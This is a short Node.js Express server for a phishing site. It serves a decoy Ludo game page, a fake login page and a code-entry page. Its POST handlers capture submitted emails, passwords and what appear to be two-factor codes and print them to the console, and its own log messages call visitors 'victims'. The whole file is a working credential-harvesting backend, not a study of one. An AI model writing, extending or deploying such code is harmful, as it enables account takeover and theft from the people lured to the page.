const express = require('express');
const bodyParser = require('body-parser')
const PORT = 3000;
const app = express();

app.use(express.static('public'));
app.use(bodyParser.urlencoded({extended : true}));

app.get("/",(req,res)=>{
  res.sendFile(__dirname + '/public/Ludo.html')
  console.log('victims are in Ludo Route');
});



app.get("/login",(req,res)=>{
  console.log('victims are in login Route');
  res.sendFile(__dirname + '/public/login.html')
});


app.get("/code",(req,res)=>{
  console.log('victims are in code Route');
  res.sendFile(__dirname + '/public/code.html')
});

app.post('/login',(req,res)=>{
  const email = req.body.email
  const password = req.body.password
  console.log(`email: ${email}`);
  console.log(`password: ${password}`);
  res.redirect('/code')
})

app.post('/code',(req,res)=>{
  const code = req.body.code;
  console.log(`code : ${code}`)
  res.redirect('loging')
});



app.listen(PORT,()=>{
  console.log(`server is running http://localhost:${PORT}`);
});